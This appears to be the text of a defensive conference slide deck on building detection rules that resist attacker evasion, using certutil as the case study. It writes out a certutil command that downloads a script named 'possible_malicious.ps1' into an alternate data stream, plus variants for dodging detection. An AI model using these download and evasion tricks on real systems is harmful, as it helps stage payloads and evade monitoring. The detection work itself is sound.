Resilient Detections
Avoid getting duped by nifty attackers

Resilient detections
Should... · ..be able to resist evasions and small changes to TTPs · ..ideally capture technique rather than specific command
· specific rules an still be used to detect specific cases · ..retain a low False Positive tolerance, this is often a trade-off · ..only use IOCs if there is no other way · ..be tested!

Decoding the duke and the bear
What did the bear do in the woods?

Why Dukes and bears?

Resilient detections ­ CertUtil - Encode
Lets replace - with / What if we put the argument in double quotes? Or somewhere randomly in the argument?
@olafhartong

Resilient detections ­ CertUtil ­ Technique 1 - Considerations
certutil.exe -encode somefile.ext encodedfile.ext · -encode or /encode works · -f or /f is optional, forces overwrite of the encoded file · deal with obfuscation, preferably in separate rules · certutil can be renamed

Thank you!
bonus slides if I was fast enough :D

Resilient detections ­ CertUtil ­ Technique 2 - Considerations
certutil.exe -urlcache -split -f https://hawkinslab.net/possible_malicious.ps1 c:\temp:ttt
· -urlcache or /urlcache · http:// can also be https, smb or a variable · -split or /split is optional, might be useful for IDS/IPS evasion · -f or /f is optional, only forces overwrite · a : in the last block without a \ next to it could indicate alternate file stream attempt · certutil can be renamed
